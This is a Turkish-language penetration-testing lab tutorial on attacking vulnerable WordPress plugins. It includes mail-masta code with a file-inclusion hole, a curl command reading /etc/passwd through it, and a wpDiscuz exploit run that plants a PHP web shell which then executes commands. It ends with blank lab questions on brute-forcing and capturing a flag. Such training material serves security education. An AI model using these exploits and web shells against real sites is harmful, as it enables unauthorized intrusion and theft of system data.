Yıllar boyunca WordPress core kendi payına düşen güvenlik açıklarından muzdarip olmuştur, ancak bunların büyük çoğunluğu pluginlerde bulunabilir. Burada yer alan WordPress Güvenlik Açığı İstatistikleri sayfasına göre, bu yazının yazıldığı sırada WPScan veritabanında 23.595 güvenlik açığı bulunuyordu. Bu güvenlik açıkları aşağıdaki gibi ayrıştırılabilir:

- 4% WordPress core
- 89% plugins
- 7% themes

WordPress ile ilgili güvenlik açıklarının sayısı, muhtemelen mevcut ücretsiz (ve ücretli) tema ve pluginlerin çokluğu ve her hafta daha fazlasının eklenmesi nedeniyle 2014 yılından bu yana istikrarlı bir şekilde artmıştır. Bu nedenle, bir WordPress sitesini listelerken son derece dikkatli olmalıyız çünkü yakın zamanda keşfedilen güvenlik açıklarına sahip pluginler veya hatta sitede artık bir amaca hizmet etmeyen ancak hala erişilebilen eski, kullanılmayan / unutulmuş pluginler bulabiliriz.

Not: [Wayback](https://github.com/tomnomnom/waybackurls) Machine kullanarak bir hedef sitenin eski sürümlerini aramak için waybackurls aracını kullanabiliriz. Bazen bilinen bir güvenlik açığı olan bir plugin kullanan bir WordPress sitesinin önceki bir sürümünü bulabiliriz. Plugin artık kullanılmıyorsa ancak geliştiriciler onu düzgün bir şekilde kaldırmadıysa, depolandığı dizine hala erişebilir ve bir açıktan yararlanabiliriz.


#### Vulnerable Plugins - mail-masta

Birkaç örneğe bakalım. mail-masta plugini artık desteklenmiyor ancak yıllar içinde 2.300'den fazla indirildi. Bir değerlendirme sırasında bu plugin ile karşılaşmamız olasılık dışı değil, muhtemelen bir zamanlar yüklenmiş ve unutulmuş. 2016'dan beri kimliği [doğrulanmamış SQL enjeksiyonu](https://www.exploit-db.com/exploits/41438) ve [Local File Inclusion'a](https://www.exploit-db.com/exploits/50226) maruz kalmıştır.

Şimdi mail-masta plugin için güvenlik açığı koduna bir göz atalım.

```php
<?php 

include($_GET['pl']);
global $wpdb;

$camp_id=$_POST['camp_id'];
$masta_reports = $wpdb->prefix . "masta_reports";
$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");

echo $count[0]->co;

?>
```

Gördüğümüz gibi, pl parametresi herhangi bir girdi doğrulaması veya sanitizasyon olmadan bir dosya eklememize izin verir. Bunu kullanarak web sunucusuna rastgele dosyalar ekleyebiliriz. Şimdi cURL kullanarak /etc/passwd dosyasının içeriğini almak için bundan yararlanalım.

```shell-session
[!bash!]$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
```


#### Vulnerable Plugins - wpDiscuz

wpDiscuz, sayfa gönderilerine gelişmiş yorum yapmaya yarayan bir WordPress pluginidir. Bu yazının yazıldığı sırada eklenti 1,6 milyondan fazla indirilmiş ve 90.000'den fazla aktif kuruluma sahipti, bu da onu bir değerlendirme sırasında karşılaşma şansımızın çok yüksek olduğu son derece popüler bir plugin haline getiriyor. Sürüm numarasına (7.0.4) dayanarak, bu [exploit](https://www.exploit-db.com/exploits/49967) bize komut yürütme konusunda oldukça iyi bir şansa sahip. Güvenlik açığının özü bir dosya yükleme bypass'ıdır. wpDiscuz yalnızca resim eklerine izin vermek için tasarlanmıştır. Dosya mime türü fonksiyonları atlanarak kimliği doğrulanmamış bir saldırganın kötü amaçlı bir PHP dosyası yüklemesine ve remote code execution elde etmesine izin verilebilir. Mime türü algılama fonksiyonlarının atlanması hakkında daha fazla bilgiyi [burada](https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/) bulabilirsiniz.

Exploit script iki parametre alır: -u URL ve -p geçerli bir path'in yolu.

```shell-session
[!bash!]$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1

---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] Response length:[102476] | code:[200]
[!] Got wmuSecurity value: 5c9398fcdb
[!] Got wmuSecurity value: 1 

[+] Generating random name for Webshell...
[!] Generated webshell name: uthsdkbywoxeebg

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php&quot; 

> id

[x] Failed to execute PHP code...
```

Yazılan exploit başarısız olabilir, ancak yüklenen web shell'i kullanarak komutları çalıştırmak için cURL kullanabiliriz. Exploit scriptinde görebileceğimiz komutları çalıştırmak için .php uzantısından sonra ?cmd= eklememiz yeterlidir.

```shell-session
[!bash!]$ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id

GIF689a;

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Bu örnekte, uthsdkbywoxeebg-1629904090.8191.php dosyasını temizlediğimizden emin olmak ve raporumuzun eklerinde bir kez daha test nesnesi olarak listelemek isteriz.


Soru : http://blog.inlanefreight.local adresine karşı kullanıcı numaralandırması gerçekleştirin. Admin dışında, mevcut diğer kullanıcı nedir?

Cevap : 

Soru : Keşfedilen kullanıcıya karşı bir bruteforcing  saldırısı gerçekleştirin. Kullanıcının parolasını yanıt olarak gönderin

Cevap : 

Soru :  Bu bölümde gösterilen yöntemleri kullanarak, oturum açma shell /bin/bash olarak ayarlanmış başka bir sistem kullanıcısı bulun.

Cevap : 

soru : Bu bölümdeki adımları izleyerek, host üzerinde kod yürütme elde edin ve webroot'taki flag.txt dosyasının içeriğini gönderin.

Cevap : 